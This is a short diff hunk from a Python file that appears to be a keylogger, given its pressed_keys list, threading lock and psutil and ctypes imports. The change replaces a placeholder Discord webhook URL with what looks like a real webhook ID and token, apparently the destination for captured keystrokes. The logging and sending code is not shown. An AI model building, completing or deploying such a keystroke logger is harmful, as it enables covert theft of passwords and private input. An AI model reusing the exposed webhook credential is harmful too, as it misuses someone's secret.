@@ -6,7 +6,7 @@ import ctypes
 import psutil
 
 # Replace with your actual webhook URL
-WEBHOOK_URL = "https://discord.com/api/webhooks/MYWEBHOOK :3"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1387605887237226646/fh_LQRtNW0lQJ-AJS3cgaxfPtTO5NqchPd8mweitqv8IXzpb_E5yERaF9XN2IOp1bSJs :3"
 
 pressed_keys = []
 lock = threading.Lock()
